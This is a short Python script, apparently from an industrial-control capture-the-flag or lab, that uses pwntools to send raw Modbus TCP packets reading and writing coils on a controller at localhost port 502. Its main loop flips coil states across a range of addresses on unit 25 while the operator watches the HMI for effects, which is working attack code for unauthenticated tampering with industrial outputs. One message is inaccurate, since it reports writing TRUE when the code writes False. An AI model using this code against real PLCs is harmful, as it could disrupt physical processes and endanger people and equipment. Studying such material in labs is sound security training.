from pwn import remote, context
import struct

context.log_level = 'error'

HOST = "localhost"
PORT = 502

def read_coil(conn, uid, start_address):
    transaction_id = 1
    protocol_id = 0 
    function_code = 0x01 

    header = struct.pack(">HHH", transaction_id, protocol_id, 6)
    pdu = bytes([uid, function_code]) + struct.pack(">HH", start_address, 1)
    modbuspacket = header + pdu 
    conn.send(modbuspacket)
    response = conn.recv(1024)

    if len(response) < 9:
        raise Exception(f"Respuesta corta: {response.hex()}")

    function_code_response = response[7]
    if function_code_response >= 0x80:
        exception_code = response[8]
        raise Exception(f"Modbus error: {exception_code:02X}")
    
    coil_state = response[9]
    return bool(coil_state & 0x01)

def write_coil(conn, uid, start_address, value):
    transaction_id = 1
    protocol_id = 0
    function_code = 0x05

    if value :
        newCoilState = 0xFF00
    else:
        newCoilState = 0x0000
    
    header = struct.pack(">HHH", transaction_id, protocol_id, 6)
    pdu = bytes([uid, function_code]) + struct.pack(">HH", start_address, newCoilState)
    modbuspacket = header + pdu
    conn.send(modbuspacket)
    response = conn.recv(1024)

    function_code_response = response[7]
    exception_code = response[8]
    if function_code_response >= 0x80:
        raise Exception(f"An error was detected!{exception_code:02X}")


if __name__ == "__main__":
    print("[*] Probando write en coils 1337-1360 UID=25...")
    for addr in range(1337, 1360):
        if addr == 1350:
            continue  # Ya sabemos que este es el grifo
        try:
            conn = remote(HOST, PORT, timeout=2)
            write_coil(conn, 25, addr, False)
            print(f"  [+] Escribí TRUE en addr={addr} - mira el HMI")
            conn.close()
            input("    Pulsa ENTER para continuar al siguiente...")
        except Exception as e:
            conn.close()
            print(f"  [-] addr={addr}: {e}")